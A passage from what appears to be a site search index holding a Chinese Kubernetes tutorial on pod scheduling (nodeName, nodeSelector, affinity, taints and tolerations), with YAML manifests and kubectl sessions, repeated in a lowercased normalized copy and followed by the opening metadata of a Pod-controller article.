key=value:effect\n\n# 去除污点\nkubectl taint nodes 节点名称 key:effect-\n\n# 去除所有污点\nkubectl taint nodes 节点名称 key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n接下来，演示下污点的效果：\n\n 1. 准备节点 node1（为了演示效果更加明显，暂时停止 node2 节点）\n 2. 为 node1 节点设置一个污点: tag=heima:PreferNoSchedule ；然后创建 pod1 (pod1 可以)\n 3. 修改为 node1 节点设置一个污点: tag=heima:NoSchedule ；然后创建 pod2 (pod1 正常 pod2 失败)\n 4. 修改为 node1 节点设置一个污点: tag=heima:NoExecute ；然后创建 pod3 (3 个 pod 都失败)\n\n# 为node1设置污点(PreferNoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:PreferNoSchedule\n\n# 创建pod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP           NODE   \ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1    \n\n# 为node1设置污点(取消PreferNoSchedule，设置NoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:PreferNoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoSchedule\n\n# 创建pod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP            NODE\ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     Pending   0          21s     <none>        <none>   \n\n# 为node1设置污点(取消NoSchedule，设置NoExecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:NoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoExecute\n\n# 创建pod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \ntaint1-7665f7fd85-htkmp   0/1     Pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     Pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     Pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> 使用 kubeadm 搭建的集群，默认就会给 master 节点添加一个污点标记，所以 pod 就不会调度到 master 节点上.\n\n容忍（Toleration）\n\n上面介绍了污点的作用，我们可以在 node 上添加污点用于拒绝 pod 调度上来，但是如果就是想将一个 pod 调度到一个有污点的 node 上去，这时候应该怎么做呢？这就要使用到容忍。\n\n\n\n> 污点就是拒绝，容忍就是忽略，Node 通过污点拒绝 pod 调度上去，Pod 通过容忍忽略拒绝\n\n下面先通过一个案例看下效果：\n\n 1. 上一小节，已经在 node1 节点上打上了 NoExecute 的污点，此时 pod 是调度不上去的\n 2. 本小节，可以通过给 pod 添加容忍，然后将其调度上去\n\n创建 pod-toleration.yaml, 内容如下\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # 添加容忍\n  - key: "tag"        # 要容忍的污点的key\n    operator: "Equal" # 操作符\n    value: "heima"    # 容忍的污点的value\n    effect: "NoExecute"   # 添加容忍的规则，这里必须和标记的污点规则相同\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 添加容忍之前的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \npod-toleration   0/1     Pending   0          3s    <none>   <none>   <none>           \n\n# 添加容忍之后的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP            NODE    NOMINATED\npod-toleration   1/1     Running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n下面看一下容忍的详细配置:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nFIELDS:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationSeconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key 对应着要容忍的污点的键，空意味着匹配所有的键\n * value 对应着要容忍的污点的值\n * operator key-value 的运算符，支持 Equal 和 Exists（默认）\n * effect 对应污点的 effect，空意味着匹配所有影响\n * tolerationSeconds 容忍时间，当 effect 为 NoExecute 时生效，表示 pod 在 Node 上的停留时间',normalizedContent:'在默认情况下，一个 pod 在哪个 node 节点上运行，是由 scheduler 组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，我们想控制某些 pod 到达某些节点上，那么应该怎么做呢？这就要求了解 kubernetes 对 pod 的调度规则，kubernetes 提供了四大类调度方式：\n\n * 自动调度：运行在哪个节点上完全由 scheduler 经过一系列的算法计算得出\n * 定向调度：nodename、nodeselector\n * 亲和性调度：nodeaffinity、podaffinity、podantiaffinity\n * 污点（容忍）调度：taints、toleration\n\n\n# 定向调度\n\n定向调度，指的是利用在 pod 上声明 nodename 或者 nodeselector，以此将 pod 调度到期望的 node 节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标 node 不存在，也会向上面进行调度，只不过 pod 运行失败而已。\n\nnodename\n\nnodename 用于强制约束将 pod 调度到指定的 name 的 node 节点上。这种方式，其实是直接跳过 scheduler 的调度逻辑，直接将 pod 调度到指定名称的节点。\n\n接下来，实验一下：创建一个 pod-nodename.yaml 文件\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # 指定调度到node1节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#查看pod调度到node属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip            node      ......\npod-nodename   1/1     running   0          56s   10.244.1.87   node1     ......   \n\n# 接下来，删除pod，修改nodename的值为node3（并没有node3节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#再次查看，发现已经向node3节点调度，但是由于不存在node3节点，所以pod无法正常运行\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip       node    ......\npod-nodename   0/1     pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nnodeselector\n\nnodeselector 用于将 pod 调度到添加了指定标签的 node 节点上。它是通过 kubernetes 的 label-selector 机制实现的，也就是说，在 pod 创建之前，会由 scheduler 使用 matchnodeselector 调度策略进行 label 匹配，找出目标 node，然后将 pod 调度到目标节点，该匹配规则是强制约束。\n\n接下来，实验一下：\n\n1 首先分别为 node 节点添加标签\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 创建一个 pod-nodeselector.yaml 文件，并使用它创建 pod\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeselector: \n    nodeenv: pro # 指定调度到具有nodeenv=pro标签的节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#查看pod调度到node属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nname               ready   status    restarts   age     ip          node    ......\npod-nodeselector   1/1     running   0          47s   10.244.1.87   node1   ......\n\n# 接下来，删除pod，修改nodeselector的值为nodeenv: xxxx（不存在打有此标签的节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#再次查看，发现pod无法正常运行,node的值为none\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname               ready   status    restarts   age     ip       node    \npod-nodeselector   0/1     pending   0          2m20s   <none>   <none>\n\n# 查看详情,发现node selector匹配失败的提示\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 亲和性调度\n\n介绍了两种定向调度的方式，使用起来非常方便，但是也有一定的问题，那就是如果没有满足条件的 node，那么 pod 将不会被运行，即使在集群中还有可用 node 列表也不行，这就限制了它的使用场景。\n\n基于上面的问题，kubernetes 还提供了一种亲和性调度（affinity）。它在 nodeselector 的基础之上的进行了扩展，可以通过配置的形式，实现优先选择满足条件的 node 进行调度，如果没有，也可以调度到不满足条件的节点上，使调度更加灵活。\n\naffinity 主要分为三类：\n\n * nodeaffinity (node 亲和性）: 以 node 为目标，解决 pod 可以调度到哪些 node 的问题\n * podaffinity (pod 亲和性) : 以 pod 为目标，解决 pod 可以和哪些已存在的 pod 部署在同一个拓扑域中的问题\n * podantiaffinity (pod 反亲和性) : 以 pod 为目标，解决 pod 不能和哪些已存在 pod 部署在同一个拓扑域中的问题\n\n> 关于亲和性 (反亲和性) 使用场景的说明：\n> 亲和性：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。\n> 反亲和性：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个 node 上，这样可以提高服务的高可用性。\n\nnodeaffinity\n\n首先来看一下 nodeaffinity 的可配置项：\n\npod.spec.affinity.nodeaffinity\n  requiredduringschedulingignoredduringexecution  node节点必须满足指定的所有规则才可以，相当于硬限制\n    nodeselectorterms  节点选择列表\n      matchfields   按节点字段列出的节点选择器要求列表\n      matchexpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持exists, doesnotexist, in, notin, gt, lt\n  preferredduringschedulingignoredduringexecution 优先调度到满足指定的规则的node，相当于软限制 (倾向)\n    preference   一个节点选择器项，与相应的权重相关联\n      matchfields   按节点字段列出的节点选择器要求列表\n      matchexpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持in, notin, exists, doesnotexist, gt, lt\n\tweight 倾向权重，在范围1-100。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n关系符的使用说明:\n\n- matchexpressions:\n  - key: nodeenv              # 匹配存在标签的key为nodeenv的节点\n    operator: exists\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value是"xxx"或"yyy"的节点\n    operator: in\n    values: ["xxx","yyy"]\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value大于"xxx"的节点\n    operator: gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n接下来首先演示一下 requiredduringschedulingignoredduringexecution , 创建 pod-nodeaffinity-required.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeaffinity: #设置node亲和性\n      requiredduringschedulingignoredduringexecution: # 硬限制\n        nodeselectorterms:\n        - matchexpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 查看pod状态 （运行失败）\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip       node    ...... \npod-nodeaffinity-required   0/1     pending   0          16s   <none>   <none>  ......\n\n# 查看pod的详情\n# 发现调度失败，提示node选择失败\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#接下来，停止pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# 修改文件，将values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# 再次启动\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 此时查看，发现调度成功，已经将pod调度到了node1上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip            node  ...... \npod-nodeaffinity-required   1/1     running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n接下来再演示一下 requiredduringschedulingignoredduringexecution , 创建 pod-nodeaffinity-preferred.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeaffinity: #设置node亲和性\n      preferredduringschedulingignoredduringexecution: # 软限制\n      - weight: 1\n        preference:\n          matchexpressions: # 匹配env的值在["xxx","yyy"]中的标签(当前环境没有)\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# 查看pod状态 （运行成功）\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nname                         ready   status    restarts   age\npod-nodeaffinity-preferred   1/1     running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> nodeaffinity 规则设置的注意事项：\n> 1 如果同时定义了 nodeselector 和 nodeaffinity，那么必须两个条件都得到满足，pod 才能运行在指定的 node 上\n> 2 如果 nodeaffinity 指定了多个 nodeselectorterms，那么只需要其中一个能够匹配成功即可\n> 3 如果一个 nodeselectorterms 中有多个 matchexpressions ，则一个节点必须满足所有的才能匹配成功\n> 4 如果一个 pod 所在的 node 在 pod 运行期间其标签发生了改变，不再符合该 pod 的节点亲和性需求，则系统将忽略此变化\n\npodaffinity\npodaffinity 主要实现以运行的 pod 为参照，实现让新创建的 pod 跟参照 pod 在一个区域的功能。首先来看一下 podaffinity 的可配置项：\n\npod.spec.affinity.podaffinity\n  requiredduringschedulingignoredduringexecution  硬限制\n    namespaces       指定参照pod的namespace\n    topologykey      指定调度作用域\n    labelselector    标签选择器\n      matchexpressions  按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持in, notin, exists, doesnotexist.\n      matchlabels    指多个matchexpressions映射的内容\n  preferredduringschedulingignoredduringexecution 软限制\n    podaffinityterm  选项\n      namespaces      \n      topologykey\n      labelselector\n        matchexpressions  \n          key    键\n          values 值\n          operator\n        matchlabels \n    weight 倾向权重，在范围1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologykey 用于指定调度时作用域，例如:\n> 如果指定为 kubernetes.io/hostname，那就是以 node 节点为区分范围\n> 如果指定为 beta.kubernetes.io/os, 则以 node 节点的操作系统类型来区分\n\n接下来，演示下 requiredduringschedulingignoredduringexecution\n1）首先创建一个参照 pod，pod-podaffinity-target.yaml：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #设置标签\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # 将目标pod名确指定到node1上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 启动目标pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# 查看pod状况\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nname                     ready   status    restarts   age\npod-podaffinity-target   1/1     running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2）创建 pod-podaffinity-required.yaml，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podaffinity: #设置pod亲和性\n      requiredduringschedulingignoredduringexecution: # 硬限制\n      - labelselector:\n          matchexpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: podenv\n            operator: in\n            values: ["xxx","yyy"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 pod 必须要与拥有标签 nodeenv=xxx 或者 nodeenv=yyy 的 pod 在同一 node 上，显然现在没有这样 pod，接下来，运行测试一下。\n\n# 启动pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 查看pod状态，发现未运行\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age\npod-podaffinity-required   0/1     pending   0          9s\n\n# 查看详细信息\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# 接下来修改  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# 意思是：新pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一node上\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# 然后重新创建pod，查看效果\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 发现此时pod运行正常\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age   labels\npod-podaffinity-required   1/1     running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n关于 podaffinity 的 preferredduringschedulingignoredduringexecution ，这里不再演示。\npodantiaffinity\n\npodantiaffinity 主要实现以运行的 pod 为参照，让新创建的 pod 跟参照 pod 不在一个区域中的功能。\n\n它的配置方式和选项跟 podaffinty 是一样的，这里不再做详细解释，直接做一个测试案例。\n\n1）继续使用上个案例中目标 pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                     ready   status    restarts   age     ip            node    labels\npod-podaffinity-required 1/1     running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2）创建 pod-podantiaffinity-required.yaml，内容如下：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podantiaffinity: #设置pod亲和性\n      requiredduringschedulingignoredduringexecution: # 硬限制\n      - labelselector:\n          matchexpressions: # 匹配podenv的值在["pro"]中的标签\n          - key: podenv\n            operator: in\n            values: ["pro"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 pod 必须要与拥有标签 nodeenv=pro 的 pod 不在同一 node 上，运行测试一下。\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# 查看pod\n# 发现调度到了node2上\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nname                           ready   status    restarts   age   ip            node   .. \npod-podantiaffinity-required   1/1     running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 污点和容忍\n\n污点（taints）\n\n前面的调度方式都是站在 pod 的角度上，通过在 pod 上添加属性，来确定 pod 是否要调度到指定的 node 上，其实我们也可以站在 node 的角度上，通过在 node 上添加污点属性，来决定是否允许 pod 调度过来。\n\nnode 被设置上污点之后就和 pod 之间存在了一种相斥的关系，进而拒绝 pod 调度进来，甚至可以将已经存在的 pod 驱逐出去。\n\n污点的格式为： key=value:effect , key 和 value 是污点的标签，effect 描述污点的作用，支持如下三个选项：\n\n * prefernoschedule：kubernetes 将尽量避免把 pod 调度到具有该污点的 node 上，除非没有其他节点可调度\n * noschedule：kubernetes 将不会把 pod 调度到具有该污点的 node 上，但不会影响当前 node 上已存在的 pod\n * noexecute：kubernetes 将不会把 pod 调度到具有该污点的 node 上，同时也会将 node 上已存在的 pod 驱离\n\n\n\n使用 kubectl 设置和去除污点的命令示例如下：\n\n# 设置污点\nkubectl taint nodes 节点名称 key=value:effect\n\n# 去除污点\nkubectl taint nodes 节点名称 key:effect-\n\n# 去除所有污点\nkubectl taint nodes 节点名称 key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n接下来，演示下污点的效果：\n\n 1. 准备节点 node1（为了演示效果更加明显，暂时停止 node2 节点）\n 2. 为 node1 节点设置一个污点: tag=heima:prefernoschedule ；然后创建 pod1 (pod1 可以)\n 3. 修改为 node1 节点设置一个污点: tag=heima:noschedule ；然后创建 pod2 (pod1 正常 pod2 失败)\n 4. 修改为 node1 节点设置一个污点: tag=heima:noexecute ；然后创建 pod3 (3 个 pod 都失败)\n\n# 为node1设置污点(prefernoschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:prefernoschedule\n\n# 创建pod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age     ip           node   \ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1    \n\n# 为node1设置污点(取消prefernoschedule，设置noschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:prefernoschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noschedule\n\n# 创建pod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nname                      ready   status    restarts   age     ip            node\ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     pending   0          21s     <none>        <none>   \n\n# 为node1设置污点(取消noschedule，设置noexecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:noschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noexecute\n\n# 创建pod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age   ip       node     nominated \ntaint1-7665f7fd85-htkmp   0/1     pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> 使用 kubeadm 搭建的集群，默认就会给 master 节点添加一个污点标记，所以 pod 就不会调度到 master 节点上.\n\n容忍（toleration）\n\n上面介绍了污点的作用，我们可以在 node 上添加污点用于拒绝 pod 调度上来，但是如果就是想将一个 pod 调度到一个有污点的 node 上去，这时候应该怎么做呢？这就要使用到容忍。\n\n\n\n> 污点就是拒绝，容忍就是忽略，node 通过污点拒绝 pod 调度上去，pod 通过容忍忽略拒绝\n\n下面先通过一个案例看下效果：\n\n 1. 上一小节，已经在 node1 节点上打上了 noexecute 的污点，此时 pod 是调度不上去的\n 2. 本小节，可以通过给 pod 添加容忍，然后将其调度上去\n\n创建 pod-toleration.yaml, 内容如下\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # 添加容忍\n  - key: "tag"        # 要容忍的污点的key\n    operator: "equal" # 操作符\n    value: "heima"    # 容忍的污点的value\n    effect: "noexecute"   # 添加容忍的规则，这里必须和标记的污点规则相同\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 添加容忍之前的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip       node     nominated \npod-toleration   0/1     pending   0          3s    <none>   <none>   <none>           \n\n# 添加容忍之后的pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip            node    nominated\npod-toleration   1/1     running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n下面看一下容忍的详细配置:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nfields:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationseconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key 对应着要容忍的污点的键，空意味着匹配所有的键\n * value 对应着要容忍的污点的值\n * operator key-value 的运算符，支持 equal 和 exists（默认）\n * effect 对应污点的 effect，空意味着匹配所有影响\n * tolerationseconds 容忍时间，当 effect 为 noexecute 时生效，表示 pod 在 node 上的停留时间',charsets:{cjk:!0}},{title:"kubernetes(八) Pod 控制器详解",frontmatter:{title:"kubernetes(八) Pod 控制器详解",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/607.kubernetes(%E5%85%AB)%20Pod%20%E6%8E%A7%E5%88%B6%E5%99%A8%E8%AF%A6%E8%A7%A3.html",relativePath:"04.运维/60.Kubernetes/607.kubernetes(八) Pod 控制器详解.md",key:"v-4af5aed9",path:"/kubernetes/607/",headers:[{level:2,title:"Pod控制器介绍",slug:"pod控制器介绍",normalizedTitle:"pod 控制器介绍",charIndex:2},{level:2,title:"ReplicaSet(RS)",slug:"replicaset-rs",normalizedTitle:"replicaset(rs)",charIndex:788},{level:2,title:"Deployment(Deploy)",slug:"deployment-deploy",normalizedTitle:"deployment(deploy)",charIndex:6384},{level:2,title:"Horizontal Pod Autoscaler(HPA)",slug:"horizontal-pod-autoscaler-hpa",normalizedTitle:"horizontal pod autoscaler(hpa)",charIndex:19499},{level:2,title:"DaemonSet(DS)",slug:"daemonset-ds",normalizedTitle:"daemonset(ds)",charIndex:27271},{level:2,title:"Job",slug:"job",normalizedTitle:"job",charIndex:675},{level:2,title:"CronJob(CJ)",slug:"cronjob-cj",normalizedTitle:"cronjob(cj)",charIndex:33743}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Pod控制器介绍 ReplicaSet(RS) Deployment(Deploy) Horizontal Pod Autoscaler(HPA) DaemonSet(DS) Job CronJob(CJ)",content:'# Pod 控制器介绍\n\nPod 是 kubernetes 的最小管理单元，在 kubernetes 中，按照 pod 的创建方式可以将其分为两类：\n\n * 自主式 pod：kubernetes 直接创建出来的 Pod，这种 pod 删除后就没有了，也不会重建\n * 控制器创建的 pod：kubernetes 通过控制器创建的 pod，这种 